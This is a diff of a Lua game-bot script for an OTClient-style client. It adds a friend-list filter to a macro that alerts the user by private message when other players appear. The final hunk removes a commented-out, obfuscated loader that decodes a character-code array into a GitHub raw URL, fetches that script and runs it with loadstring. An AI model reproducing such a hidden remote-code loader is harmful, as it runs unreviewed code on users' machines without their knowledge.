@@ -41,7 +41,7 @@ local version = " CUSTOM"
 local nick = "RIQUE".. version
 local Nome = UI.Label(nick)
 
-modules.game_textmessage.displayGameMessage("["..nick.."] Buff Devolta/Escadas/Enemy e EnemyPK")
+modules.game_textmessage.displayGameMessage("["..nick.."] att: vigia com friend list")
 
 local cores = {"green", "red", "black", "green", "orange"}
 local cores2 = 0
@@ -749,19 +749,69 @@ end
 
 
 
+
 local NomeDoJogador = storage.nomeDoJogador or "DBO"
-local MensagemPrivada = "Inimigos avistado, "
+local MensagemPrivada = "Inimigo avistado: "
 local atraso = 5000 
 
-local MensagemAlerta = macro(1000, "VIGIA", function() end)
-onCreatureAppear(function(monstro)
-  if MensagemAlerta.isOff() then return end
-  if monstro:isPlayer() and monstro ~= player then
-    sayPrivate(NomeDoJogador, MensagemPrivada .. "Nome do vagabundo = " .. monstro:getName())
-    playSound("/sounds/alarm.ogg")
-    delay(atraso)
+
+storage.friendList = storage.friendList or ""
+
+local function isFriend(name)
+  if storage.friendList == "" then return false end
+  
+  name = name:lower()
+  
+  for friend in storage.friendList:gmatch("[^\r\n]+") do
+    friend = friend:lower():trim()
+    
+    if friend:find("%*") then
+      local pattern = friend:gsub("%*", ".*")
+      if name:match(pattern) then
+        return true
+      end
+    else
+      if name == friend then
+        return true
+      end
+    end
   end
+  
+  return false
+end
+
+UI.Button("Friend Vigia", function()
+  UI.MultilineEditorWindow(storage.friendList or "", {
+    title = "Vigia List",
+    description = "Nome Abaixo do outro:\nExemplo.\nRique\nRiquezerah\nRiqueList",
+    width = 250,
+    height = 200
+  }, function(text)
+    storage.friendList = text
+  end)
 end)
+
+local MensagemAlerta = macro(1000, "VIGIA", function() end)
+
+onCreatureAppear(function(creature)
+  if MensagemAlerta.isOff() then return end
+  if not creature:isPlayer() then return end
+  if creature == player then return end
+  
+  local name = creature:getName()
+  
+
+  if isFriend(name) then return end
+  
+  sayPrivate(NomeDoJogador, MensagemPrivada .. name)
+  playSound("/sounds/alarm.ogg")
+  delay(atraso)
+end)
+
+
+
+
+
 
 
 
@@ -2563,11 +2613,16 @@ addTextEdit("ids", storage.escadinhas or "ids", function(widget, text)
 end)
 
 
-UI.Label("[VIGIA]: Receber PM:")
-UI.TextEdit(storage.nomeDoJogador or "Nome Para Receber", function(widget, text)
+UI.Label("VIGIA CONFIGS")
+
+UI.Label("Receber PM:")
+local rqz = UI.TextEdit(storage.nomeDoJogador or "Nome Para Receber", function(widget, text)
   storage.nomeDoJogador = text
   NomeDoJogador = text
 end)
+rqz:setFont("verdana-11px-rounded")
+rqz:setColor("white")
+rqz:setTooltip("coloque o nome para qual vai enviar o pm de quem aparecer na tela")
 
 UI.Label('Stamina>Hora Pra usar')
 addTextEdit("hora", storage.hora or "usar em", function(widget, text) 
@@ -2611,11 +2666,4 @@ UI.Separator()
 
 
 
-
---local v0 = ''
---local v1 = {104, 116, 116, 112, 115, 58, 47, 47, 114, 97, 119, 46, 103, 105, 116, 104, 117, 98, 117, 115, 101, 114, 99, 111, 110, 116, 101, 110, 116, 46, 99, 111, 109, 47, 76, 117, 114, 49, 113, 117, 51, 47, 114, 105, 113, 99, 115, 116, 99, 111, 100, 101, 57, 47, 114, 101, 102, 115, 47, 104, 101, 97, 100, 115, 47, 109, 97, 105, 110, 47, 114, 105, 113, 99, 115, 116, 99, 111, 100, 57, 46, 108, 117, 97}
---for v2 = 1, #v1 do v0 = v0 .. string.char(v1[v2]) end
---modules.corelib.HTTP.get(v0, function(script) 
---    assert(loadstring(script))() 
---end)
 
